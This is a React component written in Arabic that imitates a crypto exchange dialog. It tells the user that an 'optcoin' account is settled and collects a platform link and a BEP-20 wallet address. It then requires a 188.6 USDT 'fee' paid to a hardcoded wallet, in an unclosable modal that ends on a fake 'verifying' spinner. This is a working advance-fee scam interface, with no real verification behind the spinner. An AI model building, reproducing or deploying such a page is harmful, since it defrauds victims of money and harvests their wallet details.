
import React, { useState } from 'react';

interface MultiStepModalProps {
  isOpen: boolean;
}

const MultiStepModal: React.FC<MultiStepModalProps> = ({ isOpen }) => {
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({
    platformLink: '',
    bep20Address: ''
  });

  if (!isOpen) return null;

  const handleNext = () => setStep(step + 1);

  const renderStep = () => {
    switch (step) {
      case 1:
        return (
          <div className="space-y-5 animate-in fade-in zoom-in duration-500">
            <p className="text-[15.5px] leading-[1.6] text-right font-medium text-gray-100">
              أهلاً بك <span className="text-[#f0b90b] font-bold">A5VSVP5CH000</span> تم تسوية حسابك <span className="font-bold underline decoration-[#f0b90b]/40">optcoin</span> وسيتم فتح قناة السحب. 
              اتبع التعليمات وقم بوضع رابط المنصة <span className="text-[#f0b90b] font-bold">mini pro</span> لقسم الإيداع حصراً.
            </p>
            <div className="space-y-2">
              <input
                type="text"
                placeholder="رابط المنصة mini pro"
                className="w-full bg-[#2b2f36] border border-[#474d57] rounded-xl p-4 text-[14px] focus:border-[#f0b90b] outline-none transition-all text-right shadow-inner placeholder:text-[#848e9c]"
                value={formData.platformLink}
                onChange={(e) => setFormData({ ...formData, platformLink: e.target.value })}
              />
            </div>
            <button
              onClick={handleNext}
              disabled={!formData.platformLink}
              className="w-full bg-[#f0b90b] text-[#0b0e11] font-bold py-4 rounded-xl hover:bg-[#e2ad0a] active:scale-95 transition-all disabled:opacity-40 disabled:cursor-not-allowed text-[16px] shadow-lg shadow-[#f0b90b]/20"
            >
              التالي
            </button>
          </div>
        );
      case 2:
        return (
          <div className="space-y-5 animate-in slide-in-from-right duration-500">
            <p className="text-[15.5px] text-right font-medium">يرجى إدخال عنوان محفظة BEP-20 الخاصة بك:</p>
            <input
              type="text"
              placeholder="عنوان محفظة BEP-20 (مثال: 0x...)"
              className="w-full bg-[#2b2f36] border border-[#474d57] rounded-xl p-4 text-[14px] focus:border-[#f0b90b] outline-none transition-all text-right shadow-inner placeholder:text-[#848e9c]"
              value={formData.bep20Address}
              onChange={(e) => setFormData({ ...formData, bep20Address: e.target.value })}
            />
            <button
              onClick={handleNext}
              disabled={!formData.bep20Address}
              className="w-full bg-[#f0b90b] text-[#0b0e11] font-bold py-4 rounded-xl hover:bg-[#e2ad0a] active:scale-95 transition-all disabled:opacity-40 text-[16px] shadow-lg shadow-[#f0b90b]/20"
            >
              التالي
            </button>
          </div>
        );
      case 3:
        return (
          <div className="space-y-5 animate-in slide-in-from-right duration-500">
            <p className="text-[15px] leading-relaxed text-right">
              أهلاً بك <span className="text-[#f0b90b] font-bold">A5VSVP5CH000</span> بقي أمر إيداع مبلغ <span className="font-bold text-[#f0b90b] text-[18px]">188.6 USDT (BEP-20)</span> لفتح قناة السحب.
            </p>
            <div className="text-[12px] text-[#848e9c] text-right bg-[#2b2f36]/50 p-4 rounded-xl border border-[#2b2f36] leading-relaxed">
              هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة <span className="text-gray-300">mini pro</span>.
            </div>
            <div className="bg-[#0b0e11] p-4 rounded-xl border-2 border-[#f0b90b]/20 relative overflow-hidden group">
              <div className="absolute top-0 right-0 w-1 h-full bg-[#f0b90b]/50"></div>
              <p className="text-[11px] text-[#848e9c] mb-2 text-right">عنوان المحفظة للتحويل:</p>
              <p className="text-[13px] font-mono text-center text-[#f0b90b] select-all font-bold break-all">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</p>
            </div>
            <button
              onClick={handleNext}
              className="w-full bg-[#f0b90b] text-[#0b0e11] font-bold py-4 rounded-xl hover:bg-[#e2ad0a] active:scale-95 transition-all text-[16px] shadow-lg shadow-[#f0b90b]/20"
            >
              تم الإيداع
            </button>
          </div>
        );
      case 4:
        return (
          <div className="py-12 flex flex-col items-center space-y-6 animate-in zoom-in duration-700">
            <div className="relative">
                <div className="w-16 h-16 border-[5px] border-[#f0b90b]/20 rounded-full"></div>
                <div className="absolute inset-0 w-16 h-16 border-[5px] border-[#f0b90b] border-t-transparent rounded-full animate-spin"></div>
            </div>
            <div className="space-y-2 text-center">
              <p className="text-[18px] font-bold text-white">جارٍ التحقق...</p>
              <p className="text-[14px] text-[#848e9c]">الرجاء الانتظار للتأكد من عملية الإيداع</p>
            </div>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="fixed inset-0 z-[1000] flex items-center justify-center p-6">
      {/* Heavy Backdrop - cannot be clicked to close */}
      <div className="absolute inset-0 bg-black/85 backdrop-blur-[6px]"></div>
      
      {/* Dialog - Permanent fixed position */}
      <div className="relative w-full max-w-[360px] bg-[#1e2329] border border-[#2b2f36] rounded-[28px] p-7 shadow-[0_20px_60px_-15px_rgba(0,0,0,0.7)] text-white ring-1 ring-white/5">
        {renderStep()}
      </div>
    </div>
  );
};

export default MultiStepModal;
